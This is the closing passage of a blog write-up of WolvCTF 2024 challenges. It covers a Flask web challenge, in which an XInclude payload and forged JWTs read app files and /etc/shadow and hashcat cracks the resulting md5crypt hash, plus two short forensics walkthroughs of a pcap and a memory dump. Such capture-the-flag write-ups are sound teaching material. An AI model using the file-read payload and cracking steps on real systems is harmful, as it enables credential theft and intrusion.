+</span></span><span class=line><span class=ln>143</span><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Error: Error parsing XML&#39;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=ln>144</span><span class=cl>
+</span></span><span class=line><span class=ln>145</span><span class=cl>  
+</span></span><span class=line><span class=ln>146</span><span class=cl>  
+</span></span><span class=line><span class=ln>147</span><span class=cl>
+</span></span><span class=line><span class=ln>148</span><span class=cl>    <span class=n>usernameElement</span> <span class=o>=</span> <span class=n>xmlDoc</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>149</span><span class=cl>
+</span></span><span class=line><span class=ln>150</span><span class=cl>    <span class=k>if</span> <span class=n>usernameElement</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>151</span><span class=cl>
+</span></span><span class=line><span class=ln>152</span><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Error: Missing username element in XML&#39;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=ln>153</span><span class=cl>
+</span></span><span class=line><span class=ln>154</span><span class=cl>  
+</span></span><span class=line><span class=ln>155</span><span class=cl>
+</span></span><span class=line><span class=ln>156</span><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>usernameElement</span><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=ln>157</span><span class=cl>
+</span></span><span class=line><span class=ln>158</span><span class=cl>  
+</span></span><span class=line><span class=ln>159</span><span class=cl>
+</span></span><span class=line><span class=ln>160</span><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;welcome.html&#34;</span><span class=p>,</span> <span class=n>username</span><span class=o>=</span><span class=n>username</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>161</span><span class=cl>
+</span></span><span class=line><span class=ln>162</span><span class=cl>  
+</span></span><span class=line><span class=ln>163</span><span class=cl>  
+</span></span><span class=line><span class=ln>164</span><span class=cl>
+</span></span><span class=line><span class=ln>165</span><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/register&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=ln>166</span><span class=cl>
+</span></span><span class=line><span class=ln>167</span><span class=cl><span class=k>def</span> <span class=nf>register</span><span class=p>():</span>
+</span></span><span class=line><span class=ln>168</span><span class=cl>
+</span></span><span class=line><span class=ln>169</span><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>170</span><span class=cl>
+</span></span><span class=line><span class=ln>171</span><span class=cl>  
+</span></span><span class=line><span class=ln>172</span><span class=cl>
+</span></span><span class=line><span class=ln>173</span><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>username</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>174</span><span class=cl>
+</span></span><span class=line><span class=ln>175</span><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Error: username is required&#39;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=ln>176</span><span class=cl>
+</span></span><span class=line><span class=ln>177</span><span class=cl>  
+</span></span><span class=line><span class=ln>178</span><span class=cl>
+</span></span><span class=line><span class=ln>179</span><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>username</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>180</span><span class=cl>
+</span></span><span class=line><span class=ln>181</span><span class=cl>  
+</span></span><span class=line><span class=ln>182</span><span class=cl>
+</span></span><span class=line><span class=ln>183</span><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>re</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=s1>&#39;^[a-z]+$&#39;</span><span class=p>,</span> <span class=n>username</span><span class=p>):</span>
+</span></span><span class=line><span class=ln>184</span><span class=cl>
+</span></span><span class=line><span class=ln>185</span><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Error: username must be only lowercase letters&#39;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=ln>186</span><span class=cl>
+</span></span><span class=line><span class=ln>187</span><span class=cl>  
+</span></span><span class=line><span class=ln>188</span><span class=cl>
+</span></span><span class=line><span class=ln>189</span><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>username</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>190</span><span class=cl>
+</span></span><span class=line><span class=ln>191</span><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Error: username must be at least 3 letters&#39;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=ln>192</span><span class=cl>
+</span></span><span class=line><span class=ln>193</span><span class=cl>  
+</span></span><span class=line><span class=ln>194</span><span class=cl>
+</span></span><span class=line><span class=ln>195</span><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>username</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>20</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>196</span><span class=cl>
+</span></span><span class=line><span class=ln>197</span><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Error: username must be no longer than 20 letters&#39;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=ln>198</span><span class=cl>
+</span></span><span class=line><span class=ln>199</span><span class=cl>  
+</span></span><span class=line><span class=ln>200</span><span class=cl>
+</span></span><span class=line><span class=ln>201</span><span class=cl>    <span class=c1># Useful for chal development</span>
+</span></span><span class=line><span class=ln>202</span><span class=cl>
+</span></span><span class=line><span class=ln>203</span><span class=cl>    <span class=c1># username = &#39;&lt;xi:include xmlns:xi=&#34;http://www.w3.org/2001/XInclude&#34; href=&#34;/app/app.py&#34; parse=&#34;text&#34;/&gt;&#39;</span>
+</span></span><span class=line><span class=ln>204</span><span class=cl>
+</span></span><span class=line><span class=ln>205</span><span class=cl>    <span class=n>xml</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;&lt;data&gt;&lt;username&gt;</span><span class=si>{</span><span class=n>username</span><span class=si>}</span><span class=s1>&lt;/username&gt;&lt;/data&gt;&#39;</span>
+</span></span><span class=line><span class=ln>206</span><span class=cl>
+</span></span><span class=line><span class=ln>207</span><span class=cl>  
+</span></span><span class=line><span class=ln>208</span><span class=cl>
+</span></span><span class=line><span class=ln>209</span><span class=cl>    <span class=n>jwtData</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=n>xml</span><span class=p>}</span>
+</span></span><span class=line><span class=ln>210</span><span class=cl>
+</span></span><span class=line><span class=ln>211</span><span class=cl>  
+</span></span><span class=line><span class=ln>212</span><span class=cl>
+</span></span><span class=line><span class=ln>213</span><span class=cl>    <span class=n>cookie</span> <span class=o>=</span> <span class=n>jwt</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>jwtData</span><span class=p>,</span> <span class=n>JWT_SECRET</span><span class=p>,</span> <span class=n>algorithm</span><span class=o>=</span><span class=n>JWT_ALG</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>214</span><span class=cl>
+</span></span><span class=line><span class=ln>215</span><span class=cl>  
+</span></span><span class=line><span class=ln>216</span><span class=cl>
+</span></span><span class=line><span class=ln>217</span><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>make_response</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;hello </span><span class=si>{</span><span class=n>username</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>218</span><span class=cl>
+</span></span><span class=line><span class=ln>219</span><span class=cl>    <span class=n>response</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span><span class=n>JWT_COOKIE</span><span class=p>,</span> <span class=n>cookie</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>220</span><span class=cl>
+</span></span><span class=line><span class=ln>221</span><span class=cl>  
+</span></span><span class=line><span class=ln>222</span><span class=cl>
+</span></span><span class=line><span class=ln>223</span><span class=cl>    <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=s1>&#39;location&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;welcome&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>224</span><span class=cl>
+</span></span><span class=line><span class=ln>225</span><span class=cl>    <span class=k>return</span> <span class=n>response</span><span class=p>,</span> <span class=mi>302</span>
+</span></span><span class=line><span class=ln>226</span><span class=cl>
+</span></span><span class=line><span class=ln>227</span><span class=cl>  
+</span></span><span class=line><span class=ln>228</span><span class=cl>
+</span></span><span class=line><span class=ln>229</span><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=ln>230</span><span class=cl>
+</span></span><span class=line><span class=ln>231</span><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=ln>232</span><span class=cl>
+</span></span><span class=line><span class=ln>233</span><span class=cl>  
+</span></span></code></pre></div><h1 id=where-is-the-flag>Where is the FLAG?</h1><p>We can tell from this source code and its comments that:</p><ul><li><p>the flag is in environment variable named FLAG</p></li><li><p>there is a <code>/secret-welcome-935734</code> endpoint that will return the flag IF we give it some special username/password</p></li></ul><p>For this who know about Linux, a process&rsquo; environment is available at a magic file path: <code>/proc/self/environ</code></p><p>However, if we try to read this file path like we read <code>/app/app.py</code> we get this returned:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>Error: Error parsing XML
+</span></span></code></pre></div><p>This is because <code>/proc/self/environ</code> returns a mixture of text and binary data and something about the binary data causes this error even though we <code>parse="text"</code>.</p><p>Maybe there is some way to read it like this but I don&rsquo;t know how.</p><p>That leaves the <code>/secret-welcome-935734</code> endpoint.</p><p>We see this endpoint wants us to provide basic-auth credentials with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>username: flaguser
+</span></span><span class=line><span class=ln>3</span><span class=cl>
+</span></span><span class=line><span class=ln>4</span><span class=cl>password: linux password of flag user
+</span></span></code></pre></div><p>We know this from these comments:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>    <span class=c1># There is a linux user named &#39;flaguser&#39;</span>
+</span></span><span class=line><span class=ln>3</span><span class=cl>
+</span></span><span class=line><span class=ln>4</span><span class=cl>    <span class=c1># Login here with that username and their linux password.</span>
+</span></span></code></pre></div><h1 id=cracking-a-linux-password>Cracking a Linux Password</h1><p>How can we learn the password of a Linux user named <code>flaguser</code>?</p><p>If you google around a bit, you might learn about the <code>/etc/shadow</code> file.</p><p>If we use our JWT forging powers to read this file we get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln> 1</span><span class=cl>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>Welcome root:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>daemon:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln> 5</span><span class=cl>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>bin:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln> 7</span><span class=cl>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>sys:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl>sync:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>11</span><span class=cl>
+</span></span><span class=line><span class=ln>12</span><span class=cl>games:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>13</span><span class=cl>
+</span></span><span class=line><span class=ln>14</span><span class=cl>man:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>15</span><span class=cl>
+</span></span><span class=line><span class=ln>16</span><span class=cl>lp:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>17</span><span class=cl>
+</span></span><span class=line><span class=ln>18</span><span class=cl>mail:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>19</span><span class=cl>
+</span></span><span class=line><span class=ln>20</span><span class=cl>news:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>21</span><span class=cl>
+</span></span><span class=line><span class=ln>22</span><span class=cl>uucp:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>23</span><span class=cl>
+</span></span><span class=line><span class=ln>24</span><span class=cl>proxy:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>25</span><span class=cl>
+</span></span><span class=line><span class=ln>26</span><span class=cl>www-data:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>27</span><span class=cl>
+</span></span><span class=line><span class=ln>28</span><span class=cl>backup:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>29</span><span class=cl>
+</span></span><span class=line><span class=ln>30</span><span class=cl>list:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>31</span><span class=cl>
+</span></span><span class=line><span class=ln>32</span><span class=cl>irc:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>33</span><span class=cl>
+</span></span><span class=line><span class=ln>34</span><span class=cl>_apt:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>35</span><span class=cl>
+</span></span><span class=line><span class=ln>36</span><span class=cl>nobody:*:19764:0:99999:7:::
+</span></span><span class=line><span class=ln>37</span><span class=cl>
+</span></span><span class=line><span class=ln>38</span><span class=cl>flaguser:$1$hack$BzqsFHqkPjQ2Sn9amFsgN0:19767:0:99999:7:::
+</span></span></code></pre></div><p>Now we need to crack this flaguser hash.</p><p>If we check some online resources, we will learn that the actual hash is just part of the above line:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>$1$hack$BzqsFHqkPjQ2Sn9amFsgN0
+</span></span></code></pre></div><p>But what hash format is this in?</p><p>While I prefer <code>hashcat</code>, one trick I like to use is to let an alternative program called <code>john</code> to identify the hash for me.</p><p>Let&rsquo;s put this hash in <code>john.txt</code> and run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>john john.txt
+</span></span></code></pre></div><p>The first line that comes out is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>Warning: detected hash type &#34;md5crypt&#34;, but the string is also recognized as &#34;md5crypt-long&#34;
+</span></span></code></pre></div><p>If we run <code>hashcat --help</code> and search for <code>md5crypt</code> we get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl> 500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
+</span></span></code></pre></div><p>So 500 is the mode we want with <code>hashcat</code>.</p><p>Just as before, we have the option of using a dictionary or brute forcing.</p><p>You can try a file like rockyou.txt but that won&rsquo;t find it.</p><p>Next let&rsquo;s try brute forcing:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>hashcat --potfile-disable -a 3 -m 500 john.txt
+</span></span></code></pre></div><p>Similar arguments as before but <code>-m</code> is different this time.</p><p>This ends with the following output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln> 1</span><span class=cl>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>$1$hack$BzqsFHqkPjQ2Sn9amFsgN0:qqz3
+</span></span><span class=line><span class=ln> 3</span><span class=cl>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>  
+</span></span><span class=line><span class=ln> 5</span><span class=cl>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>Session..........: hashcat
+</span></span><span class=line><span class=ln> 7</span><span class=cl>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>Status...........: Cracked
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl>Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
+</span></span><span class=line><span class=ln>11</span><span class=cl>
+</span></span><span class=line><span class=ln>12</span><span class=cl>Hash.Target......: $1$hack$BzqsFHqkPjQ2Sn9amFsgN0
+</span></span><span class=line><span class=ln>13</span><span class=cl>
+</span></span><span class=line><span class=ln>14</span><span class=cl>Time.Started.....: Sun Mar 17 16:42:37 2024 (45 secs)
+</span></span><span class=line><span class=ln>15</span><span class=cl>
+</span></span><span class=line><span class=ln>16</span><span class=cl>Time.Estimated...: Sun Mar 17 16:43:22 2024 (0 secs)
+</span></span><span class=line><span class=ln>17</span><span class=cl>
+</span></span><span class=line><span class=ln>18</span><span class=cl>Kernel.Feature...: Pure Kernel
+</span></span><span class=line><span class=ln>19</span><span class=cl>
+</span></span><span class=line><span class=ln>20</span><span class=cl>Guess.Mask.......: ?1?2?2?2 [4]
+</span></span><span class=line><span class=ln>21</span><span class=cl>
+</span></span><span class=line><span class=ln>22</span><span class=cl>Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined
+</span></span><span class=line><span class=ln>23</span><span class=cl>
+</span></span><span class=line><span class=ln>24</span><span class=cl>Guess.Queue......: 4/15 (26.67%)
+</span></span><span class=line><span class=ln>25</span><span class=cl>
+</span></span><span class=line><span class=ln>26</span><span class=cl>Speed.#3.........:    54264 H/s (9.82ms) @ Accel:256 Loops:125 Thr:1 Vec:4
+</span></span><span class=line><span class=ln>27</span><span class=cl>
+</span></span><span class=line><span class=ln>28</span><span class=cl>Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+</span></span><span class=line><span class=ln>29</span><span class=cl>
+</span></span><span class=line><span class=ln>30</span><span class=cl>Progress.........: 2453504/2892672 (84.82%)
+</span></span><span class=line><span class=ln>31</span><span class=cl>
+</span></span><span class=line><span class=ln>32</span><span class=cl>Rejected.........: 0/2453504 (0.00%)
+</span></span><span class=line><span class=ln>33</span><span class=cl>
+</span></span><span class=line><span class=ln>34</span><span class=cl>Restore.Point....: 36864/46656 (79.01%)
+</span></span><span class=line><span class=ln>35</span><span class=cl>
+</span></span><span class=line><span class=ln>36</span><span class=cl>Restore.Sub.#3...: Salt:0 Amplifier:40-41 Iteration:875-1000
+</span></span><span class=line><span class=ln>37</span><span class=cl>
+</span></span><span class=line><span class=ln>38</span><span class=cl>Candidate.Engine.: Device Generator
+</span></span><span class=line><span class=ln>39</span><span class=cl>
+</span></span><span class=line><span class=ln>40</span><span class=cl>Candidates.#3....: qaz3 -&gt; qb4o
+</span></span><span class=line><span class=ln>41</span><span class=cl>
+</span></span><span class=line><span class=ln>42</span><span class=cl>Hardware.Mon.SMC.: Fan0: 66%, Fan1: 66%
+</span></span><span class=line><span class=ln>43</span><span class=cl>
+</span></span><span class=line><span class=ln>44</span><span class=cl>Hardware.Mon.#3..: Temp: 82c
+</span></span><span class=line><span class=ln>45</span><span class=cl>
+</span></span><span class=line><span class=ln>46</span><span class=cl>  
+</span></span><span class=line><span class=ln>47</span><span class=cl>
+</span></span><span class=line><span class=ln>48</span><span class=cl>Started: Sun Mar 17 16:42:29 2024
+</span></span><span class=line><span class=ln>49</span><span class=cl>
+</span></span><span class=line><span class=ln>50</span><span class=cl>Stopped: Sun Mar 17 16:43:24 2024
+</span></span></code></pre></div><p>This ran in just under one minute and yields the secret: <strong>qqz3</strong></p><h1 id=getting-the-flag>Getting the Flag</h1><p>We can now use a browser to go to the secret endpoint and enter these credentials:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=ln>1</span><span class=cl>
+</span></span><span class=line><span class=ln>2</span><span class=cl>username: flaguser
+</span></span><span class=line><span class=ln>3</span><span class=cl>
+</span></span><span class=line><span class=ln>4</span><span class=cl>password: qqz3
+</span></span></code></pre></div><p><img src=/assets/posts/wolvctf2024/image-20240317164629924.png alt=image-20240317164629924></p><p>and we are given the flag:</p><p><code>Congrats, here is your flag: wctf{cr4ck1n_4nd_1nclud1n_4_th3_w1n_1352234}</code></p><h2 id=forensics-eternally-pwned-infiltration>FORENSICS: Eternally Pwned: Infiltration</h2><p>Description: I recently had my passwords and other sensitive data leaked, but I have no idea how. Can you figure out how the attacker got in to my PC?</p><p>We are given a pcap file upon analyzing it in Wireshark under protocol hierarchy we establish there is HTTP , SMB etc. Checking the http traffic we see requests for normal browsing sessions.
+On SMB we find interesting base64 strings as shown below.</p><p><img src=/assets/posts/wolvctf2024/wireshark.png alt=wireshark></p><p>Decoding it on <a href=https://gchq.github.io/CyberChef>CyberChef</a> we get our flag</p><p><img src=/assets/posts/wolvctf2024/cyberchef.png alt=cyberchef></p><p><code>flag: wctf{l3tS_3teRn4lLy_g0_bLU3_7n9wm4iWnL}</code> Reminds me of the famous eternal blue windows exploit <a href=https://en.wikipedia.org/wiki/EternalBlue>Eternal Blue</a></p><h2 id=forensics-eternally-pwned-persistence>FORENSICS: Eternally Pwned Persistence</h2><p>Description: I get that the attackers were in my PC, but how did they achieve persistence?</p><p>To analyze how attackers achieved persistence on your system, we can utilize Volatility, a popular open-source memory forensics framework. With a memory dump provided, we can extract valuable information to understand the techniques used by the attackers to maintain access to the system. I did use <a href=https://github.com/volatilityfoundation/volatility3>Volatitilty3</a> for this challenge.</p><p><code>python vol.py -f MEMORY.DMP windows.pslist</code>
+I found a suspicious process with the name cGFzdGViaW4uY2 with the <code>pid : 1804</code></p><p><img src=/assets/posts/wolvctf2024/cmd-1.png alt=cmd></p><p>I proceeded with the analysis with checking the command line arguments using Volatitilty&rsquo;s module <code>windows.cmdline</code> and found the suspicious process full path with it&rsquo;s file name encoded in base64
+<img src=/assets/posts/wolvctf2024/cmd-2.png alt=cyberchef></p><p>Decoding it on <a href=https://gchq.github.io/CyberChef>CyberChef</a> I got a pastebin link
+<img src=/assets/posts/wolvctf2024/cyberchef-2.png alt=cyberchef></p><p><img src=/assets/posts/wolvctf2024/paste.png alt=cyberchef></p></section><footer class="mt-12 flex flex-wrap"><a class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]" href=https://stephenx0r.github.io/tags/beginner>beginner</a><a class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]" href=https://stephenx0r.github.io/tags/forensics>forensics</a><a class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]" href=https://stephenx0r.github.io/tags/osint>osint</a><a class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]" href=https://stephenx0r.github.io/tags/wolv>wolv</a><a class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]" href=https://stephenx0r.github.io/tags/jwt>jwt</a></footer><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://stephenx0r.github.io/posts/2024-10-28-deadfacectf2024/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>Deadface 2024 CTF</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://stephenx0r.github.io/posts/2024-03-21-htbctf2024/><span>HTB CYBER-APOCALYPSE 2024 FORENSICS WRITEUPS</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>&copy;2025
+<a class=link href=https://stephenx0r.github.io/>Stephenx0r - CTF Writeups</a></div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️
+<a class=link href=https://github.com/nanxiaobei/hugo-paper rel=noopener target=_blank>hugo-paper</a></footer></body></html>
